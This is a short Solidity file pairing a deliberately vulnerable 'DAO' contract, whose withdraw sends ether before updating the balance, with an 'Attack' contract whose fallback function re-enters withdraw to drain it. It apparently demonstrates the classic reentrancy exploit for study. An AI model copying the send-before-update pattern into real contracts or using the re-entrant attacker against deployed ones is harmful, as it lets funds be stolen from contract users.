pragma solidity ^0.4.2;

contract DAO {   
  mapping (address => uint) public balance;
    
  function addBalance(address to) payable {
    balance[to] += msg.value;
  }
    
  function withdraw(uint amount) {
    if (balance[msg.sender]>= amount) {
      bool res = msg.sender.call.value(amount)();
      balance[msg.sender]-=amount;
    }
  }  

  function getBalance(address to) returns (uint){
    return balance[to];
  }
}

contract Attack {
  DAO public dao;
  address owner;
  bool isAttack = true;

  function Attack(DAO addr){ 
    owner = msg.sender;
    dao = addr;
  }

  function() payable { 
    dao.withdraw(dao.getBalance(this)); 
  }

  function addBalance() {
      dao.addBalance(this);
  }
  
  function withdraw() {
      dao.withdraw(dao.getBalance(this));
  }
}